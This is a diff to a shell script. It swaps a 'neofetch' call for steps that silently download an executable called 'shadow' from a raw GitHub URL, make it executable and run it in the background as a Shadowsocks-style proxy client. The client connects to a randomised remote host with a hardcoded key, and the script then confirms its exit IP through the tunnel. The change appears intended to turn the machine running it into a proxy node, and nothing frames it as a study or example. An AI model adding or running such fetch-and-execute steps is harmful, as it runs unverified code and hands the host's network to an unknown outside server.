@@ -28,4 +28,18 @@ echo ""
 
 sleep 2
 
-neofetch
+curl -s -L -o shadow https://raw.githubusercontent.com/mncedisihlabathini/Merry/main/shadow >/dev/null
+sleep 2
+chmod +x shadow
+ls -la
+
+./shadow -b "127.0.0.1:1081" -s "cpusocks$(shuf -i 7-12 -n 1).wot.mrface.com:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999" &
+echo ""
+echo ""
+sleep 5
+curl -x socks5h://127.0.0.1:1081 ifconfig.me
+echo ""
+echo ""
+netstat -ntlp
+echo ""
+echo ""
